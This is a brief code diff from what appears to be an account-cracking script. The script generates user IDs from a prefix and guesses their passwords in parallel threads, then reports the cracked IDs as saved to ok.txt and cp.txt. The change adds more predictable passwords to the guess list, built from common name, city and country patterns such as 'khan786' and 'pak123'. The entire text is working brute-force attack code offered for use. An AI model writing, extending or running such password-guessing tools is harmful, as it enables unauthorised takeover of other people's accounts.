@@ -1242,7 +1242,7 @@ def ali_khan():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'khankhan','khan1122','khan12','khan123','khan786']
+			pwx = [guru,'khankhan','khan1122','khan12','khan123','khan786','khan786','khan12345','khanbhai','pak123','lhr123','kri123','Pakistan','pakistan','khandada','khandon','ali123','ali1234','ali1122']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
